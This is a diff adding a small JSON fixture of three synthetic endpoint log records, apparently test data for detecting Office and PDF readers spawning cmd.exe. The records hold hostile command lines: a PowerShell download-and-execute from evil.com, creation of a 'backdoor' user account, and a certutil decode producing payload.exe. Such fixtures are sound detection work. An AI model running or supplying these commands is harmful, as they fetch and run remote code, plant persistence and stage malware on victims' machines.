@@ -1,0 +1,32 @@
+[
+  {
+    "id": "cs_mal_001",
+    "TimeGenerated": "2024-01-15T14:00:00Z",
+    "DeviceName": "WORKSTATION-01",
+    "AccountName": "jdoe",
+    "InitiatingProcessFileName": "winword.exe",
+    "FileName": "cmd.exe",
+    "ProcessCommandLine": "cmd.exe /c powershell -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com')",
+    "OfficeApplication": true
+  },
+  {
+    "id": "cs_mal_002",
+    "TimeGenerated": "2024-01-15T14:05:00Z",
+    "DeviceName": "WORKSTATION-02",
+    "AccountName": "jsmith",
+    "InitiatingProcessFileName": "excel.exe",
+    "FileName": "cmd.exe",
+    "ProcessCommandLine": "cmd.exe /c net user backdoor P@ssw0rd! /add",
+    "OfficeApplication": true
+  },
+  {
+    "id": "cs_mal_003",
+    "TimeGenerated": "2024-01-15T14:10:00Z",
+    "DeviceName": "WORKSTATION-03",
+    "AccountName": "baduser",
+    "InitiatingProcessFileName": "acrord32.exe",
+    "FileName": "cmd.exe",
+    "ProcessCommandLine": "cmd.exe /c certutil -decode C:\\Users\\Public\\encoded.txt C:\\Users\\Public\\payload.exe",
+    "PDFApplication": true
+  }
+]
